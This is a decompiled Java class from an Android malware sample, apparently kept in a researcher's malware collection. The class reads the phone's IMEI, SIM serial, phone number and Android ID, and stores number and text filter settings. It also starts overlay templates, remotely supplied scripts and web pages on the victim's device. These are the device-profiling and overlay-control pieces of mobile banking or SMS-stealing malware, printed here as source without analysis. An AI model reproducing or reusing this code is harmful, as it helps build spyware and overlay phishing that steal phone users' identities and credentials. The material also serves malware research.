package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

public class MeSetting
{
  Context mContext;
  
  MeSetting(Context paramContext)
  {
    this.mContext = paramContext;
  }
  
  private String capitalize(String paramString)
  {
    String str;
    if ((paramString == null) || (paramString.length() == 0)) {
      str = "";
    }
    char c;
    do
    {
      return str;
      c = paramString.charAt(0);
      str = paramString;
    } while (Character.isUpperCase(c));
    return Character.toUpperCase(c) + paramString.substring(1);
  }
  
  @SuppressLint({"NewApi"})
  public void StartHome()
  {
    Intent localIntent = new Intent("android.intent.action.MAIN");
    localIntent.addCategory("android.intent.category.HOME");
    localIntent.setFlags(268435456);
    this.mContext.startActivity(localIntent);
  }
  
  public String deviceid()
  {
    return Settings.Secure.getString(this.mContext.getContentResolver(), "android_id");
  }
  
  public String filter()
  {
    return this.mContext.getSharedPreferences("setfilterconf", 0).getString("filter", "");
  }
  
  public String filter2()
  {
    return this.mContext.getSharedPreferences("setfilterconf", 0).getString("filter2", "");
  }
  
  public String getApplicationName()
  {
    PackageManager localPackageManager = this.mContext.getApplicationContext().getPackageManager();
    try
    {
      Object localObject = localPackageManager.getApplicationInfo(this.mContext.getPackageName(), 0);
      if (localObject != null)
      {
        localObject = localPackageManager.getApplicationLabel((ApplicationInfo)localObject);
        return (String)localObject;
      }
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      for (;;)
      {
        String str = null;
        continue;
        str = "(unknown)";
      }
    }
  }
  
  public String getDeviceName()
  {
    String str1 = Build.MANUFACTURER;
    String str2 = Build.MODEL;
    if (str2.startsWith(str1)) {
      return capitalize(str2);
    }
    return capitalize(str1) + " " + str2;
  }
  
  @SuppressLint({"NewApi"})
  public String getDomain()
  {
    String str = "";
    try
    {
      ApplicationInfo localApplicationInfo = this.mContext.getPackageManager().getApplicationInfo(this.mContext.getPackageName(), 128);
      if (localApplicationInfo.metaData != null) {
        str = localApplicationInfo.metaData.getString("domain");
      }
      return str;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      localNameNotFoundException.printStackTrace();
    }
    return "";
  }
  
  @SuppressLint({"NewApi"})
  public void hideTPL()
  {
    OverlayService.stop();
    System.exit(0);
  }
  
  public String imei()
  {
    return ((TelephonyManager)this.mContext.getSystemService("phone")).getDeviceId();
  }
  
  public String imsi()
  {
    return ((TelephonyManager)this.mContext.getSystemService("phone")).getSimSerialNumber();
  }
  
  public String model()
  {
    return getDeviceName();
  }
  
  public String operator()
  {
    return ((TelephonyManager)this.mContext.getSystemService("phone")).getNetworkOperator();
  }
  
  public String packagename()
  {
    return this.mContext.getApplicationContext().getPackageName();
  }
  
  public String sdk()
  {
    return Build.VERSION.RELEASE;
  }
  
  public void setFilterNumber(String paramString)
  {
    SharedPreferences.Editor localEditor = this.mContext.getSharedPreferences("setfilterconf", 0).edit();
    localEditor.putString("filter", paramString);
    localEditor.commit();
  }
  
  public void setFilterText(String paramString)
  {
    SharedPreferences.Editor localEditor = this.mContext.getSharedPreferences("setfilterconf", 0).edit();
    localEditor.putString("filter2", paramString);
    localEditor.commit();
  }
  
  @SuppressLint({"NewApi"})
  public void startPage(String paramString)
  {
    new Intent();
    if ((paramString.contains("#fullnotitle")) || (paramString.contains("#notitle"))) {}
    for (Intent localIntent = new Intent(this.mContext, MasterPage2.class);; localIntent = new Intent(this.mContext, MasterPage.class))
    {
      localIntent.putExtra("url", paramString);
      localIntent.setFlags(268435456);
      this.mContext.startActivity(localIntent);
      return;
    }
  }
  
  @SuppressLint({"NewApi"})
  public void startScript(String paramString)
  {
    Intent localIntent = new Intent(this.mContext, GlobalCode.class);
    localIntent.putExtra("content", paramString);
    localIntent.putExtra("type", "start");
    localIntent.putExtra("data", "");
    this.mContext.startService(localIntent);
  }
  
  @SuppressLint({"NewApi"})
  public void startTPL(String paramString)
  {
    Intent localIntent = new Intent(this.mContext, OverlayService.class);
    localIntent.putExtra("tpl", paramString);
    this.mContext.startService(localIntent);
  }
  
  public String tel()
  {
    return ((TelephonyManager)this.mContext.getSystemService("phone")).getLine1Number();
  }
  
  public String timer()
  {
    return String.valueOf(this.mContext.getSharedPreferences("settingspref", 0).getInt("timer", Integer.valueOf(3599).intValue()));
  }
  
  public String typenat()
  {
    String str = "n/a";
    ConnectivityManager localConnectivityManager = (ConnectivityManager)this.mContext.getSystemService("connectivity");
    if (localConnectivityManager.getActiveNetworkInfo().getType() == 0) {}
    for (int i = 1;; i = 0)
    {
      boolean bool = localConnectivityManager.getNetworkInfo(1).isAvailable();
      if (i != 0) {
        str = "mobile";
      }
      if (bool) {
        str = "wifi";
      }
      return str;
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MeSetting.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */